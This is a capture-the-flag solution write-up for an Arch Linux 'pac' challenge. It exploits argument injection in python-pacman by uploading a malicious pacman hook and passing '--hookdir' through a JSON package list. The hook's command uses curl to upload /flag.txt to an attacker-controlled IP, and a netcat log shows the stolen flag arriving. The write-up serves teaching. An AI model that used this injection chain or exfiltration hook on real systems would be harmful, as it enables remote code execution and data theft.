# spoiler: this is the solution

The problem was a parameter injection vulnerabilty in the python-pacman module [(before it got patched by #1)](https://github.com/peakwinter/python-pacman/pull/1)

That's the `install` function to install a package with pacman ([source](https://github.com/peakwinter/python-pacman/blob/1320f51058780d7654360831aa11a33c53989edc/pacman.py#L9)):  
```python
def install(packages, needed=True):
    # Install package(s)
    s = pacman("-S", packages, ["--needed" if needed else None])
    if s["code"] != 0:
        raise Exception("Failed to install: {0}".format(s["stderr"]))
```

The called `pacman` function looks like ([source](https://github.com/peakwinter/python-pacman/blob/1320f51058780d7654360831aa11a33c53989edc/pacman.py#L174)):
```python
def pacman(flags, pkgs=[], eflgs=[]):
    # Subprocess wrapper, get all data
    if not pkgs:
        cmd = ["pacman", "--noconfirm", flags]
    elif type(pkgs) == list:
        cmd = ["pacman", "--noconfirm", flags]
        cmd += pkgs
    else:
        cmd = ["pacman", "--noconfirm", flags, pkgs]
    if eflgs and any(eflgs):
        eflgs = [x for x in eflgs if x]
        cmd += eflgs
    p = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    data = p.communicate()
    data = {"code": p.returncode, "stdout": data[0].decode(),
            "stderr": data[1].rstrip(b'\n').decode()}
    return data
```

Our application uses it the following way:

```python
@app.route("/install", methods=['GET', 'POST'])
@check_json('package')
def install():
    package = request.get_json(force=True)['package']
    pacman.install(package)
    return jsonify({'status': 'OK'})
```

As we use json we can send `package` as a list instead of a string. This will allow us to inject something in the `subprocess.Popen` call. It does not allow us to injection arbitrary commands. But it allow us to inject parameter. `pacman` allows us to run hooks after/before installing a package. This is how we will get code exection. Therefore, we need to upload a file to the server. Therefore we can exploit the `/check` api backend with a little trick.

```python
@app.route("/check", methods=['GET', 'POST'])
@check_json('name', 'content')
def checksum():
    f_name = request.get_json(force=True)['name']
    f_content = request.get_json(force=True)['content']
    with open(tmp_dir + f_name.replace("..", ""), "wb") as f:
        f.write(b64decode(f_content.encode()))
    stdout = check_output("/usr/bin/namcap -e checksums,filenames {}{}".format(tmp_dir, quote(f_name)), shell=True)
    remove(tmp_dir + f_name.replace("..", ""))
    return jsonify({'output': stdout.decode()})
```

1) Upload a file
    - call /check with the following parameters:
        - name: -d.hook
        - content:
        ```
[Trigger]
Operation = Upgrade
Operation = Install
Operation = Remove
Type = Package
Target = *

[Action]
Description = Cleaning pacman cache...
When = PostTransaction
Exec = /bin/bash -c "curl --upload-file /flag.txt http://192.168.10.70:5001"
        ```
    - What will happen is:
        - our pacman hook will be uploaded to '/tmp/pacman/-d.hook'
        - `/usr/bin/namcap -e checksums,filenames /tmp/pacman/-d.hook` will be executed and fails because it sees a `-d` (parses it as option)
        - the python call `check_output` will throw an exception an exception because `/usr/bin/namcap` exited with a non-zero value
    - the call to /check will give you a 500. But the file stays on the server

2) Install a package and get code execution using a pacman hook with our uploaded file
    - call the `install` endpoint with the following parameter `package`
        package: ["--hookdir", "/tmp/pacman/", "wget"]
    - this will install the package wget
    - `pacman` will use /tmp/pacman as hookdir (only files ending with .hook are used)
    - WIN.

## exploit.py
```bash
kmille@linbox mrmcd18-pac master % python exploit.py
Testing /info
info works
Testing /install
install works
Testing /remove
remove works
Testing /install
install works
Testing /check
check works
Uploaded hook
Testing /remove
remove works
```

```bash
kmille@linbox mrmcd18-pac master % nc -lvp 5001
Listening on license.sublimehq.com 5001
Connection received on 172.19.0.2 56558
PUT /flag.txt HTTP/1.1
Host: 192.168.10.70:5001
User-Agent: curl/7.69.1
Accept: */*
Content-Length: 20
Expect: 100-continue

MRMCD{4rch 15 b357}

```
